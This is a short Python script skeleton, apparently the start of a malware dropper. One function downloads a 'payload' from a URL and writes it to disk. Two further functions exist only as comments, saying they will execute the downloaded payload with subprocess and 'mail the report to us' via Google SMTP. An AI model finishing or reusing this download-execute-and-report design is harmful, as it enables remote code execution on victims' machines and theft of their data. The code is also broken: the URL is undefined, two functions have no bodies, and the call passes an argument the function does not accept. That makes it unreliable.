#!/usr/bin/env python
import subprocess
import smtplib
import requests

def get_payload():
        get_request = requests.get(url)
        print(get_request.content)
        name = url.split("/")[-1]
        with open(name, "wb") as payload:
            payload.write(get_request.content)

def execute_it():
    #execute the downloaded payload using subprocess module

def mail_it():
    #mail the report to us using google smtp server


get_payload([payload_url])